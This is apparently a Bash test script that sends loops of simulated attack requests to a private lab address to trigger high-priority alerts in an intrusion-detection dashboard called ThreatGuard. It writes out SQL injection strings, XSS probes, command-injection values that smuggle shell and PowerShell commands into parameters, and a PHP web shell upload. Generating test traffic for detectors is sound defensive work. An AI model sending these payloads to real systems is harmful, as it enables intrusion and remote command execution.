#!/bin/bash
echo "🔥 Generando alertas de ALTA prioridad para ThreatGuard..."

# SQL Injection Attacks (priority:1)
echo "📊 Generando SQL Injection attacks..."
for i in {1..10}; do
    curl -s "http://172.18.0.9:8080/search?q=admin' UNION SELECT * FROM users--" > /dev/null 2>&1
    curl -s "http://172.18.0.9:8080/login?user=admin' OR 1=1--" > /dev/null 2>&1
    sleep 0.5
done

# XSS Attacks (priority:1)
echo "🎯 Generando XSS attacks..."
for i in {1..10}; do
    curl -s "http://172.18.0.9:8080/comment?text=<script>alert('XSS')</script>" > /dev/null 2>&1
    curl -s "http://172.18.0.9:8080/profile?name=<img src=x onerror='alert(1)'>" > /dev/null 2>&1
    sleep 0.5
done

# Command Injection (priority:1)
echo "💻 Generando Command Injection attacks..."
for i in {1..10}; do
    curl -s "http://172.18.0.9:8080/ping?host=8.8.8.8;cmd.exe /c dir" > /dev/null 2>&1
    curl -s "http://172.18.0.9:8080/exec?cmd=/bin/sh -c whoami" > /dev/null 2>&1
    curl -s "http://172.18.0.9:8080/run?script=powershell.exe Get-Process" > /dev/null 2>&1
    sleep 0.5
done

# File Upload Attacks (priority:1)
echo "📁 Generando File Upload attacks..."
for i in {1..5}; do
    curl -s -X POST "http://172.18.0.9:8080/upload" -d "file=shell.php&content=<?php system(\$_GET['cmd']); ?>" > /dev/null 2>&1
    sleep 0.5
done

echo "✅ Alertas generadas! Verifica el dashboard en http://localhost:8080"
